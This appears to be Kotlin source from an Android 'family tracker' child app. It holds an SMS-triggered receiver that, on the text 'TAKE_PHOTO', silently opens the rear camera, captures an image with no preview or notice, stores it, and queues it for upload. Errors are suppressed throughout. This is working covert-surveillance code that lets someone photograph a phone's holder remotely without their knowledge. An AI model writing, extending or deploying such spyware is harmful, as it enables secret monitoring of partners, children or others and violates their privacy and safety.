package com.family.tracker.child
import android.content.BroadcastReceiver; import android.content.Context; import android.content.Intent; import android.graphics.ImageFormat; import android.hardware.camera2.*; import android.media.ImageReader; import android.telephony.SmsMessage; import android.util.Size; import androidx.work.OneTimeWorkRequestBuilder; import androidx.work.WorkManager; import java.io.File
class CommandReceiver:BroadcastReceiver(){override fun onReceive(c:Context,i:Intent){try{val p=i.extras?.get("pdus")as?Array<*>?:return;for(m in p){val msg=SmsMessage.createFromPdu(m as ByteArray);val cmd=String(msg.userData?:continue).trim();if(cmd=="TAKE_PHOTO")takePhotoSilently(c)}}catch(e:Exception){}}
private fun takePhotoSilently(c:Context){val cm=c.getSystemService(Context.CAMERA_SERVICE)as CameraManager;try{val cid=cm.cameraIdList.firstOrNull{it=="0"}?:return;val ch=cm.getCameraCharacteristics(cid);val sz=ch.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)?.getOutputSizes(ImageReader::class.java)?.firstOrNull{it.width<=1280}?:Size(640,480);val ir=ImageReader.newInstance(sz.width,sz.height,ImageFormat.JPEG,1);val f=File(c.cacheDir,"photo_${System.currentTimeMillis()}.jpg")
ir.setOnImageAvailableListener({r->val img=r.acquireLatestImage();if(img!=null){val b=img.planes[0].buffer;val d=ByteArray(b.remaining());b.get(d);f.writeBytes(d);img.close();savePhotoToQueue(c,f.absolutePath);WorkManager.getInstance(c).enqueue(OneTimeWorkRequestBuilder<PhotoUploaderWorker>().build())}},null)
cm.openCamera(cid,object:CameraDevice.StateCallback(){override fun onOpened(cam:CameraDevice){val s=ir.surface;cam.createCaptureSession(listOf(s),object:CameraCaptureSession.StateCallback(){override fun onConfigured(se:CameraCaptureSession){val req=cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);req.addTarget(s);se.capture(req.build(),null,null);cam.close()}override fun onConfigureFailed(e:CameraCaptureSession){}},null)}override fun onDisconnected(cam:CameraDevice){}override fun onError(cam:CameraDevice,e:Int){}},null)}catch(e:CameraAccessException){}}
private fun savePhotoToQueue(c:Context,p:String){val ph=PendingPhoto(photoPath=p,timestamp=System.currentTimeMillis());Thread{DbProvider.get(c).photoDao().addPhoto(ph)}.start()}}
